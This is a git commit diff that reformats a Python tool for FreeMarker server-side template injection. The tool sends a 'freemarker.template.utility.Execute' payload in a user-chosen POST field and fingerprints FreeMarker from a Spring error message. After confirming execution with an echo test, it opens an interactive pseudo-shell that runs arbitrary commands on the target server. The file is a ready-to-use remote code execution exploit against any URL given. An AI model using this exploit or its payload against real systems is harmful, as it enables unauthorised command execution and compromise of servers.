6f3dbedf499f943beef64b6193685b93155e5372
evilcater <victor.lefevre2004@gmail.com>
2021-07-28 18:29:11 +0200

    reorganized

--- Tools/Freemarker_template_injection/main.py
+++ Tools/Freemarker_template_injection/main.py
@@ -4,8 +4,7 @@ import re
 from datetime import datetime
 
 
-
-#functions
+# functions
 def response(stri):
     a = stri.split('*')
     return "".join(
@@ -16,13 +15,15 @@ def response(stri):
 
 
 def inject(payload):
-	d = { args.data : '*realbacon*<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("' + payload + '") }*realbacon*' }
-	p = requests.post(args.url, data=d)
-	return p.text
+    d = {
+        args.data: '*realbacon*<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("' + payload + '") }*realbacon*'}
+    p = requests.post(args.url, data=d)
+    return p.text
+
 
 print('Freemarker template injection made by Realbacon (it\' s bad)')
 
-#parsing arguments
+# parsing arguments
 parser = argparse.ArgumentParser(description='Process some integers.')
 parser.add_argument('-u', type=str, dest='url', required=True,
                     help='Url of the target')
@@ -30,7 +31,7 @@ parser.add_argument('-d', dest='data', required=True,
                     help='POST variable to inject')
 args = parser.parse_args()
 
-#try to get a response from the url
+# try to get a response from the url
 try:
     r = requests.get(args.url)
 
@@ -38,41 +39,39 @@ except:
     print('[-]Invalid url')
     exit()
 
-fr = requests.post(args.url,'')
+fr = requests.post(args.url, '')
 
-#Try to see if the website is running FREEMARKER
+# Try to see if the website is running FREEMARKER
 if 'org.springframework.web.bind.MissingServletRequestParameterException' in fr.text:
     print(f'[+]Url : {args.url} seems to run with FREEMARKER')
 else:
     print(f'[-]Url : {args.url} does not seem to run with FREEMARKER')
     if input('Do you want to continue injection ? (y/n)') == 'n': exit()
 
-#Try to see if we can get back the data from command injection
+# Try to see if we can get back the data from command injection
 print(f'[+]Trying injection with post data : {args.data}')
 data_test = {
     args.data: '*realbacon*<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("echo $baconed$") }*realbacon*'}
 payload_test = requests.post(args.url, data=data_test)
 
-
 if response(payload_test.text).strip() == '$baconed$':
     print('[+]Injection successfull\n[+]Opening shell')
 else:
-	#We dont get a response so we close the program
+    # We dont get a response so we close the program
     print("[-]Target does not seem to be injectable...\n[-]Aborting...")
     exit()
-    
-#retrive date
+
+# retrive date
 now = datetime.now()
 time_display = now.strftime("%d/%m/%Y %H:%M:%S")
 
-#open the shell
-print(f'\n[+]Shell opened at {time_display}')	
-print('[+]'+response(inject('id')).strip())
-print("[+]Current version of OS :",response(inject('hostnamectl')).strip())
-print("[+]Current path :",response(inject('pwd')).strip())
+# open the shell
+print(f'\n[+]Shell opened at {time_display}')
+print('[+]' + response(inject('id')).strip())
+print("[+]Current version of OS :", response(inject('hostnamectl')).strip())
+print("[+]Current path :", response(inject('pwd')).strip())
 
 while True:
-	user_data = input(f'${response(inject("whoami")).strip()}- ')
-	if user_data == 'exit()' : exit()
-	print(f'>>{response(inject(user_data)).strip()}')
-	
+    user_data = input(f'${response(inject("whoami")).strip()}- ')
+    if user_data == 'exit()': exit()
+    print(f'>>{response(inject(user_data)).strip()}')
